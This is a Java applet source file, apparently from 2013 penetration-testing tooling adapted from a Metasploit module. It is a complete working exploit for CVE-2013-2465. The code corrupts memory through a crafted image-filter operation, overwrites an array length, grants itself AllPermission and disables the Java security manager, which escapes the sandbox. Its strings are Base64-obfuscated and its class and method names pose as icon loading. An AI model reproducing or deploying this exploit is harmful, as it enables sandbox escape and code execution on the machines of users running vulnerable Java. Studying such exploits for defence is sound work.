/*
 * (c) 2013 Strategic Cyber LLC
 *
 * See http://www.advancedpentest.com/license
 *
 * Exploit for CVE-2013-2465
 *
 * Metasploit Framework module: multi/browser/java_storeimagearray
 *
 * Adapted from the BSD licensed Metasploit Framework at:
 * /opt/metasploit/msf3/external/source/exploits/CVE-2013-2465
 */
import java.awt.image.*;
import java.awt.color.*;
import java.beans.Statement;
import java.security.*;
import java.applet.Applet;

public class AppIcon extends Main {
	private static final String osarch = "b3MuYXJjaA==";
	private static final String ssm    = "c2V0U2VjdXJpdHlNYW5hZ2Vy";
	private static final String filep  = "ZmlsZTovLy8=";

	public AppIcon(Applet ap) {
		super(ap);
	}

	public void check() {
		try {
			for(int i = 1; i <= 5 && System.getSecurityManager() != null; i++) {
				loadIcon();
			}

			if (System.getSecurityManager() == null) {
				new Thread(this).start();
			}
		}
		catch (Exception ex) {
		}
	}

	public static String toHex(int i) {
		return Integer.toHexString(i);
	}

	private static boolean _is64;

	class MyColorSpace extends ICC_ColorSpace {
		public MyColorSpace() {
			super(ICC_Profile.getInstance(ColorSpace.CS_sRGB));
		}

		public int getNumComponents() {
			int res = 1;
			return res;
		}
	}

	class MyColorModel extends ComponentColorModel {
		public MyColorModel() {
			super(new MyColorSpace(), new int[]{8,8,8}, false, false, 1, DataBuffer.TYPE_BYTE);
		}

		public boolean isCompatibleRaster(Raster r) {
			boolean res = true;
			return res;
		}
	}

	private int loadIcon() {
		try {
			_is64 = System.getProperty(new String(Base64.decode(osarch), "UTF-8"), "").contains("64");

			String name = new String(Base64.decode(ssm), "UTF-8");
			Object[] o1 = new Object[1];
			Object o2 = new Statement(System.class, name, o1);

			DataBufferByte dst = new DataBufferByte(16);

			int[] a = new int[8];
			Object[] oo = new Object[7];

			oo[2] = new Statement(System.class, name, o1);

			Permissions ps = new Permissions();
			ps.add(new AllPermission());
			oo[3] = new AccessControlContext(new ProtectionDomain[] { new ProtectionDomain(new CodeSource(
				new java.net.URL(new String(Base64.decode(filep), "UTF-8")), new java.security.cert.Certificate[0]), ps) });

			oo[4] = ((Statement)oo[2]).getTarget();

			int oldLen = a.length;

			BufferedImage bi1 = new BufferedImage(4,1, BufferedImage.TYPE_INT_ARGB);

			MultiPixelPackedSampleModel sm = new MultiPixelPackedSampleModel(DataBuffer.TYPE_BYTE, 4,1,1,4, 44 + (_is64 ? 8 : 0));
			WritableRaster wr = Raster.createWritableRaster(sm, dst, null);
			BufferedImage bi2 = new BufferedImage(new MyColorModel(), wr, false, null);

			bi1.getRaster().setPixel(0,0, new int[] { -1, -1, -1, -1 });

			AffineTransformOp op = new AffineTransformOp(new java.awt.geom.AffineTransform(1,0,0,1,0,0), null);
			op.filter(bi1, bi2);

			int len = a.length;
			if (len == oldLen) {
				return 1;
			}

			boolean found = false;
			int ooLen = oo.length;

			for(int i = oldLen + 2; i < oldLen + 32; i++) {
				if (a[i-1]==ooLen && a[i]==0 && a[i+1]==0 // oo[0]==null && oo[1]==null
					&& a[i+2]!=0 && a[i+3]!=0 && a[i+4]!=0   // oo[2,3,4] != null
					&& a[i+5]==0 && a[i+6]==0)               // oo[5,6] == null
				{

					int stmTrg = a[i+4];
					for(int j=i+7; j < i+7+64; j++) {
						if (a[j] == stmTrg) {
							a[j-1] = a[i+3];
							found = true;
							break;
						}
					}
				}

				if (found)
					break;
			}

			if (found) {
				((Statement)oo[2]).execute();
			}
		}
		catch (Exception ex) {
		}

		return 0;
	}
}

